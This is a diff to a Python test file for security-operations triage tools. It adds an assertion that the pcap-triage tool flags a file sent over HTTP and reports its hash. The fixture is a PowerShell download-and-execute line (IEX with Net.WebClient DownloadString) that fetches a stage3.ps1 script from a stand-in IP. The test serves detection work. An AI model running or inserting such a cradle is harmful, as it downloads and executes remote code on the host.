@@ -1,6 +1,7 @@
 """The binary-format SOC apps: pcap-triage, evtx-triage, file-inspector (CLI) and
 file-inspector-gui (on the fake gui backend)."""
 
+import hashlib
 import json
 import os
 import random
@@ -64,6 +65,8 @@ def test_pcap_triage_sample(in_tmp):
         assert finding in out, finding
     assert "25 ports on 192.0.2.10" in out and "open: 22, 80, 445" in out
     assert "login.example-secure.top" in out
+    stage2 = b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.200/stage3.ps1')\r\n"
+    assert "Files over HTTP" in out and "stage2.ps1" in out and hashlib.sha256(stage2).hexdigest() in out
     assert "Done: 94 packets" in out
     assert "Saved" in out and (in_tmp / "flagged.pcap").stat().st_size > 24
     assert "<html" in (in_tmp / "r.html").read_text().lower()
